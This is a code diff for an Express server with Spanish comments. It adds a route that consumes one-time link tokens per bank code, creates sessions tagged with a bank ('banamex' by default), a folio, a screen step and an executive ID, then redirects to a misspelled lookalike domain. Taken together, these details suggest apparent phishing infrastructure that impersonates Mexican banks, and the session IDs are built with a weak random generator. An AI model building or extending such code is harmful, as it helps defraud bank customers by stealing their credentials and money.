@@ -168,7 +168,81 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   }, 5 * 60 * 1000); // Ejecutar cada 5 minutos
 
-  // Middleware de validación de tokens de un solo uso
+  // Middleware de validación de tokens de un solo uso (con banco en el path)
+  app.get('/:bankCode/client/:token', async (req, res) => {
+    try {
+      const { token } = req.params;
+      
+      // Validar y consumir el token
+      const tokenResult = await linkTokenService.validateAndConsumeToken(token, {
+        ip: req.ip || req.connection.remoteAddress || 'unknown',
+        userAgent: req.headers['user-agent'] || 'unknown'
+      });
+
+      // Si el token es inválido, retornar error apropiado
+      if (!tokenResult.valid) {
+        if (tokenResult.reason === 'already_used' || tokenResult.reason === 'expired' || tokenResult.reason === 'cancelled') {
+          return res.status(410).json({ 
+            error: 'Link no válido',
+            reason: tokenResult.reason === 'already_used' ? 'Este link ya fue utilizado' :
+                    tokenResult.reason === 'expired' ? 'Este link ha expirado' :
+                    'Este link ha sido cancelado'
+          });
+        }
+        return res.status(404).json({ 
+          error: 'Link no encontrado',
+          reason: 'El link proporcionado no existe'
+        });
+      }
+
+      // Token válido, obtener o crear la sesión
+      let session = tokenResult.sessionId ? 
+        await storage.getSessionById(tokenResult.sessionId) : 
+        null;
+
+      // Si no existe sesión, crearla
+      if (!session) {
+        // Generar código de 8 dígitos para sessionId y folio
+        let sessionId = '';
+        for (let i = 0; i < 8; i++) {
+          sessionId += Math.floor(Math.random() * 10).toString();
+        }
+
+        // Crear la sesión con datos del token
+        session = await storage.createSession({
+          sessionId,
+          banco: tokenResult.bankCode || 'banamex',
+          folio: sessionId,
+          pasoActual: ScreenType.FOLIO,
+          createdBy: tokenResult.createdBy || 'system',
+          executiveId: null
+        });
+
+        // Actualizar el token con el sessionId creado
+        await linkTokenService.updateTokenSession(token, sessionId);
+
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
+      }
+
+      // Obtener la URL base desde la configuración del sitio
+      const siteConfig = await storage.getSiteConfig();
+      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
+      
+      // Redirigir al usuario a la sesión
+      const redirectUrl = `${baseClientUrl}/${session.sessionId}`;
+      console.log(`[Links] Redirigiendo a sesión: ${redirectUrl}`);
+      
+      res.redirect(302, redirectUrl);
+    } catch (error: any) {
+      console.error('[Links] Error procesando token:', error);
+      res.status(500).json({ 
+        error: 'Error procesando el link',
+        message: error.message 
+      });
+    }
+  });
+
+  // Middleware de validación de tokens de un solo uso (ruta legacy para compatibilidad)
   app.get('/client/:token', async (req, res) => {
     try {
       const { token } = req.params;
